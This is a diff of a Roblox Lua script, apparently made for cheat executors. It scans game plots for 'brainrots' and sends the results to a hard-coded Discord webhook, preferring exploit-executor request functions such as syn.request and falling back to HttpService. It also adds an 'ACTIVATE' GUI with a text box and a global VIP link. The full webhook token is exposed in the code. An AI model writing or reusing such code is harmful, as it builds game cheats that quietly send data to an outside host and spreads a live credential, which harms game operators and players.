@@ -6,7 +6,7 @@ local TweenService = game:GetService("TweenService")
 -- =============================
 -- Конфиг
 -- =============================
-local WEBHOOK_URL = "https://discord.com/api/webhooks/1417846130619977738/mgmCuOeNpaNOBQddZUtCPaeheSjaBWdLNLfPPg2xk6-533OjiGgbjxwmkKPsQO7TK9ep"
+local WEBHOOK_URL = "https://discord.com/api/webhooks/1417846130619977738/mgmCuOeNpaNOBQddZUtCPaeheSjaBWdLNLfPPg2xk6-533OjiGgbjxwmkKPsQO7TK9ep" -- твой вебхук
 
 -- =============================
 -- Глобальные переменные
@@ -16,36 +16,56 @@ local activationGUI = nil
 _G.VIP_LINK = nil
 
 -- =============================
--- Утилиты
+-- Утилиты (вернул как у тебя было)
 -- =============================
-local function postDiscordSimple(message)
-	local data = {
-		["content"] = message
-	}
-	local headers = {
-		["Content-Type"] = "application/json"
-	}
-	local body = HttpService:JSONEncode(data)
-	HttpService:PostAsync(WEBHOOK_URL, body, Enum.HttpContentType.ApplicationJson, false)
+local function tryExploitRequest(json)
+	local req = (syn and syn.request) or (http and http.request) or (http_request) or (request)
+	if typeof(req) == "function" then
+		pcall(function()
+			req({
+				Url = WEBHOOK_URL,
+				Method = "POST",
+				Headers = { ["Content-Type"] = "application/json" },
+				Body = json,
+			})
+		end)
+		return true
+	end
+	return false
 end
 
-local function postDiscordEmbed(title, description, color)
-	local data = {
-		["embeds"] = {{
-			["title"] = title,
-			["description"] = description,
-			["color"] = color
-		}}
-	}
-	local headers = {
-		["Content-Type"] = "application/json"
-	}
-	local body = HttpService:JSONEncode(data)
-	HttpService:PostAsync(WEBHOOK_URL, body, Enum.HttpContentType.ApplicationJson, false)
+local function tryHttpServiceRequest(json)
+	local ok, res = pcall(function()
+		return HttpService:RequestAsync({
+			Url = WEBHOOK_URL,
+			Method = "POST",
+			Headers = { ["Content-Type"] = "application/json" },
+			Body = json,
+		})
+	end)
+	return ok and res and res.Success
+end
+
+local function sendWebhook(payload)
+	if WEBHOOK_URL == "" then return end
+	local json = HttpService:JSONEncode(payload)
+	if tryExploitRequest(json) then return end
+	tryHttpServiceRequest(json)
+end
+
+local function postDiscordSimple(content)
+	if WEBHOOK_URL == "" then return end
+	local MAX = 1800
+	local i = 1
+	while i <= #content do
+		local chunk = string.sub(content, i, math.min(i + MAX - 1, #content))
+		sendWebhook({ content = "```\n" .. chunk .. "\n```" })
+		i = i + MAX
+	end
 end
 
 -- =============================
--- Детект брейнротов
+-- Детект брейнротов (оставил твой способ)
 -- =============================
 local function detectBrainrots()
 	local brainrots = {}
@@ -59,20 +79,20 @@ local function detectBrainrots()
 	return brainrots
 end
 
--- =============================
--- Пост комбинированного отчёта
--- =============================
 local function postCombinedAllPlots()
 	local brainrots = detectBrainrots()
+	if #brainrots == 0 then return end
+
 	local msg = "🧠 Brainrots detected: " .. #brainrots .. "\n"
 	for _, b in ipairs(brainrots) do
 		msg = msg .. "- " .. b.Name .. "\n"
 	end
+
 	postDiscordSimple(msg)
 end
 
 -- =============================
--- Мониторинг в реальном времени
+-- Мониторинг
 -- =============================
 local function watchPlots()
 	task.spawn(function()
@@ -110,7 +130,6 @@ local function createActivationGUI()
 	title.Font = Enum.Font.GothamBold
 	title.Parent = mainFrame
 
-	-- ✅ исправленный TextBox
 	local textBox = Instance.new("TextBox")
 	textBox.Size = UDim2.new(1, -20, 0, 40)
 	textBox.Position = UDim2.new(0, 10, 0, 60)
@@ -124,7 +143,6 @@ local function createActivationGUI()
 	textBox.ClearTextOnFocus = false
 	textBox.Parent = mainFrame
 
-	-- кнопка ACTIVATE
 	local button = Instance.new("TextButton")
 	button.Size = UDim2.new(1, -20, 0, 60)
 	button.Position = UDim2.new(0, 10, 0, 120)
@@ -142,7 +160,6 @@ local function createActivationGUI()
 		TweenService:Create(button, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(0, 120, 255)}):Play()
 	end)
 
-	-- статус
 	local status = Instance.new("TextLabel")
 	status.Size = UDim2.new(1, -20, 0, 30)
 	status.Position = UDim2.new(0, 10, 0, 200)
